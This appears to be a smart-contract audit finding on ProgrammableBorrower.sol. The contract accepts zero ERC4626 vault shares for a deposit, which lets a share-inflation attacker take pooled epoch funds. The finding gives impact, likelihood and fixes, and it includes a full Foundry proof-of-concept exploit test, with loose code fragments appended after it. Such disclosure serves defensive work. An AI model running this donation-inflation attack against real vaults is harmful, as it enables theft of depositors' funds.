### Title
ProgrammableBorrower accepts zero vault shares for a positive epoch deposit, enabling an ERC4626 inflation attacker to steal pooled funds - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower._depositToVault()` deposits the full idle balance into the configured ERC4626 vault but never validates that the call returned economically meaningful shares. An unprivileged vault user can inflate the vault’s assets-per-share before `onStartEpoch`, cause the borrower’s positive deposit to mint zero shares, and immediately redeem their own shares for both the donation and the newly deposited pool funds. The loss is then visible as `vaultLoss()` because the borrower records the deposited assets in `epochStartVaultAssets` while holding no vault shares.

### Finding Description

`IdleCDOEpochVariant.startEpoch()` sends all post-instant-withdraw surplus funds to the configured borrower and then calls `onStartEpoch()`. [1](#0-0) 

For a programmable borrower, `onStartEpoch()` snapshots the borrower’s pre-deposit asset value as `epochStartVaultAssets`, deposits its entire on-hand balance into the ERC4626 vault, and activates epoch accounting. [2](#0-1) 

The actual deposit is performed by `_depositToVault()`, which only emits the returned `shares`; it does not require `shares > 0`, enforce a minimum share amount, or verify that the returned shares can be converted back to the deposited assets. [3](#0-2) 

A floor-rounding ERC4626 vault can therefore satisfy its interface while returning zero shares for a positive deposit. If the attacker previously acquired shares and donated enough assets directly to the vault, the attacker can make:

```solidity
poolDeposit * attackerShares / vaultTotalAssets == 0
```

The pool’s assets remain in the vault, increase the attacker’s redeemable share value, and can be withdrawn by the attacker. `ProgrammableBorrower` later calculates its vault position only from shares owned by the borrower, so it correctly observes zero assets but does not prevent or revert the loss at deposit time. [4](#0-3) 

Epoch accounting then computes the missing principal as a vault loss by comparing the still-held vault position plus withdrawals against `epochStartVaultAssets`. [5](#0-4) 

### Impact Explanation

The attacker directly steals the programmable borrower’s epoch deposit, up to the full amount sent by `IdleCDOEpochVariant.startEpoch()`.

For a pool deposit `A`, an attacker holding one vault share can donate more than `A - 1` assets. The borrower’s deposit returns zero shares, while the attacker’s single share is backed by approximately `donation + seed + A`. Redeeming that share recovers the attacker’s outlay and pays an approximately `A`-sized profit, limited only by vault rounding behavior and available pool principal.

The credit vault remains with CDO-held strategy-token accounting for funds that no longer exist in the programmable borrower or vault. At epoch stop, `totalInterestDueNow()` is reduced by the vault loss and withdrawals can default or require the realized-loss path, causing LP insolvency rather than merely an accounting discrepancy. [6](#0-5) 

### Likelihood Explanation

Likelihood is medium. The issue requires a programmable-borrower deployment whose configured ERC4626 vault permits ordinary deposit/share-price manipulation through direct asset transfers. An attacker needs only a normal vault position and enough assets to make the pool’s deposit round down to zero shares; no privileged IdleCDO, manager, borrower, guardian, queue, or fee role is needed.

The attack is specifically timed before `startEpoch()`, because that hook deposits all on-hand borrower assets into the vault. [7](#0-6)  Vault implementations with virtual-share inflation protection may prevent a zero-share result at practical donation sizes, but `ProgrammableBorrower` accepts arbitrary ERC4626 vaults and contains no deposit slippage or minimum-share defense.

### Recommendation

Do not accept a positive vault deposit that returns zero or economically insufficient shares.

- In `_depositToVault()`, require `shares > 0`.
- Compare `vault.convertToAssets(shares)` with `_assetAmount` and revert if the difference exceeds a tightly bounded rounding tolerance.
- Preferably route deposits through an internal helper accepting `minSharesOut` or `minAssetValueOut`, and use at least `shares * assetsPerShare >= _assetAmount - tolerance`.
- Apply the same protection to repayment-triggered deposits in `_repay()` and epoch-start deposits in `onStartEpoch()`.
- Consider restricting approved vaults to implementations whose `convertToShares`/`deposit` path is protected against donation-based share-price inflation.

### Proof of Concept

The following Foundry PoC can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. It forks mainnet for real USDC, uses the file’s existing `MockStopEpochLiquidityVault` floor-rounding ERC4626 implementation, deploys the programmable-borrower stack against that vault, and demonstrates the theft.

```solidity
function testProgrammableBorrowerZeroShareVaultDepositTheft() external {
  address attacker = makeAddr("attacker");
  uint256 poolDeposit = 100_000 * oneScale;
  uint256 seed = 1;
  uint256 donation = poolDeposit;

  // Fork USDC state, then use a floor-rounding ERC4626 vault.
  vm.createSelectFork("mainnet", FORK_BLOCK);
  MockStopEpochLiquidityVault vulnerableVault =
    new MockStopEpochLiquidityVault(USDC);

  // Reuse the existing setup pattern, but configure the local vault.
  strategy = new IdleCreditVault();
  stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));
  strategy.initialize(USDC, owner, manager, placeholderBorrower, BORROWER_NAME, 0);

  cdoEpoch = new IdleCDOEpochVariant();
  stdstore.target(address(cdoEpoch)).sig(cdoEpoch.token.selector).checked_write(address(0));
  cdoEpoch.initialize(0, USDC, address(this), owner, rebalancer, address(strategy), 100000);
  idleCDO = IdleCDO(address(cdoEpoch));

  underlying = IERC20Detailed(USDC);
  aaTranche = IdleCDOTranche(idleCDO.AATranche());
  oneScale = 10 ** underlying.decimals();

  vm.prank(owner);
  strategy.setWhitelistedCDO(address(cdoEpoch));
  vm.prank(owner);
  strategy.setMaxApr(0);

  vm.startPrank(owner);
  cdoEpoch.setIsAYSActive(false);
  cdoEpoch.setFeeParams(TL_MULTISIG, 0, 100000, 0);
  cdoEpoch.setInstantWithdrawParams(3 days, 1.5e18, true);
  cdoEpoch.setEpochParams(36.5 days, 5 days);
  cdoEpoch.setKeyringParams(address(0), 0);
  vm.stopPrank();

  ProgrammableBorrower impl = new ProgrammableBorrower();
  programmableBorrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
    address(impl),
    makeAddr("programmableBorrowerProxyAdmin"),
    abi.encodeWithSelector(
      ProgrammableBorrower.initialize.selector,
      address(vulnerableVault),
      address(cdoEpoch),
      address(this),
      manager,
      revolvingBorrower,
      0
    )
  )));

  vm.prank(owner);
  strategy.setBorrower(address(programmableBorrower));
  vm.prank(owner);
  cdoEpoch.setIsInterestMinted(true);
  vm.prank(owner);
  cdoEpoch.setIsProgrammableBorrower(true);

  deal(USDC, address(this), poolDeposit, true);
  underlying.approve(address(cdoEpoch), type(uint256).max);
  idleCDO.depositAA(poolDeposit);

  // Attacker obtains a share and inflates its price by donating assets directly.
  deal(USDC, attacker, seed + donation, true);
  vm.startPrank(attacker);
  underlying.approve(address(vulnerableVault), type(uint256).max);
  vulnerableVault.deposit(seed, attacker);
  underlying.transfer(address(vulnerableVault), donation);
  uint256 attackerBefore = underlying.balanceOf(attacker);
  vm.stopPrank();

  // Honest manager starts the epoch. ProgrammableBorrower deposits poolDeposit
  // into the vault but receives zero shares and does not revert.
  vm.prank(manager);
  cdoEpoch.startEpoch();

  assertEq(vulnerableVault.balanceOf(address(programmableBorrower)), 0);
  assertEq(underlying.balanceOf(address(programmableBorrower)), 0);

  // The attacker's single share now owns seed + donation + poolDeposit.
  vm.prank(attacker);
  vulnerableVault.redeem(seed, attacker, attacker);

  assertEq(underlying.balanceOf(attacker), attackerBefore + seed + donation + poolDeposit);
  assertEq(programmableBorrower.vaultLoss(), poolDeposit);
  assertEq(programmableBorrower.totalInterestDueNow(), 0);
}
```

The key assertion is that the configured vault keeps the entire `poolDeposit` while minting zero shares to `ProgrammableBorrower`; the attacker redeems their existing share for the donated assets plus the pool deposit.

  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a

    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();

    if (!epochAccountingActive) return (0, 0);

  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
